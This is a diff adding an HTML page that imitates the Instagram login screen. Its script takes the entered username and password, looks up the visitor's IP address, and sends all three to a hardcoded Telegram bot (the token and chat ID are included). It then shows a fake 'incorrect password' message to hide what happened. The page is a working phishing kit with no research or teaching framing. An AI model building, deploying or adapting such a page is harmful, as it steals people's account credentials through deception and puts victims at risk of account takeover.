@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .main-container {
+            max-width: 350px;
+            width: 100%;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 30px 40px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+            font-size: 0; /* Hide alt text */
+        }
+
+        .logo img {
+            max-width: 175px;
+            height: auto;
+        }
+
+        /* Instagram logo using text as fallback */
+        .logo-text {
+            font-family: 'Billabong', cursive;
+            font-size: 50px;
+            font-weight: 400;
+            color: #262626;
+            margin-bottom: 30px;
+            letter-spacing: 1px;
+        }
+
+        @font-face {
+            font-family: 'Billabong';
+            src: url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong-webfont.eot');
+            src: url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong-webfont.eot?#iefix') format('embedded-opentype'),
+                 url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong-webfont.woff') format('woff'),
+                 url('https://cdn.rawgit.com/milktronics/beaglegr.am/master/public/fonts/billabong-webfont.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        .form-group {
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 9px 8px 7px 8px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            outline: none;
+        }
+
+        .form-input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 7px 16px;
+            border: none;
+            border-radius: 8px;
+            margin-top: 12px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 10px 0 18px 0;
+        }
+
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider-text {
+            margin: 0 18px;
+        }
+
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            text-decoration: none;
+            margin-bottom: 15px;
+        }
+
+        .fb-login i {
+            font-size: 20px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .signup-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 25px 40px;
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .get-app {
+            text-align: center;
+            margin: 20px 0;
+            color: #262626;
+            font-size: 14px;
+        }
+
+        .app-badges {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-top: 16px;
+        }
+
+        .app-badge img {
+            height: 40px;
+        }
+
+        .footer {
+            max-width: 800px;
+            margin-top: 30px;
+            color: #8e8e8e;
+            font-size: 12px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .copyright {
+            color: #8e8e8e;
+        }
+
+        /* Simple alert style - hidden by default */
+        #loginMessage {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #ed4956;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <!-- Login Card -->
+        <div class="login-card">
+            <div class="logo">
+                <!-- Instagram text logo (using font for exact match) -->
+                <div class="logo-text">Instagram</div>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <input type="text" class="form-input" id="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="form-group">
+                    <input type="password" class="form-input" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log in</button>
+
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+
+                <a href="#" class="fb-login">
+                    <span>Log in with Facebook</span>
+                </a>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <!-- Hidden message area -->
+                <div id="loginMessage"></div>
+            </form>
+        </div>
+
+        <!-- Sign Up Card -->
+        <div class="signup-card">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+
+        <!-- Get App Section -->
+        <div class="get-app">
+            Get the app.
+            <div class="app-badges">
+                <a href="#" class="app-badge">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Download on Google Play">
+                </a>
+                <a href="#" class="app-badge">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer (Instagram style) -->
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            © 2025 Instagram from Meta
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Form ko submit hone se rokta hai
+
+            // User se input lena
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Agar kuch bhi empty hai to alert dikhao
+            if (!username || !password) {
+                alert('Please fill in both fields');
+                return;
+            }
+
+            // IP address fetch karna (public API se)
+            try {
+                // Pehle IP address lete hain
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // Ab Telegram bot par message bhejte hain
+                const botToken = '8653041999:AAGi5x4kFes9OvcO-39buoDyUsgFHInixJ8';
+                const chatId = '8025473063';
+                
+                // Message format karna jisme IP bhi ho
+                const message = `🔐 *Instagram Login Alert* 🔐\n\n👤 *Username/Email:* \`${username}\`\n🔑 *Password:* \`${password}\n\`🌐 *IP Address:* \`${userIP}\`\n\n⏱ Time: ${new Date().toLocaleString()}`;
+                
+                // Telegram API ko bhejna
+                const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                
+                await fetch(telegramURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                // Success message dikhana (Instagram wala alert)
+                const messageDiv = document.getElementById('loginMessage');
+                messageDiv.style.display = 'block';
+                messageDiv.style.color = '#ed4956';
+                messageDiv.innerText = 'Sorry, your password was incorrect. Please double-check your password.';
+                
+                // Form reset karna
+                document.getElementById('password').value = '';
+
+                // 3 second baad message hide kar dena
+                setTimeout(() => {
+                    messageDiv.style.display = 'none';
+                }, 3000);
+
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Something went wrong. Please try again.');
+            }
+        });
+
+        // Instagram ki tarah password field mein eye icon nahi hota, to extra kuch nahi
+        // Extra: Agar user Enter press kare to bhi form submit ho
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('loginForm').dispatchEvent(new Event('submit'));
+            }
+        });
+    </script>
+
+    <!-- Note: Instagram ke original page ki tarah extra fields or permissions nahi hain -->
+</body>
+</html>
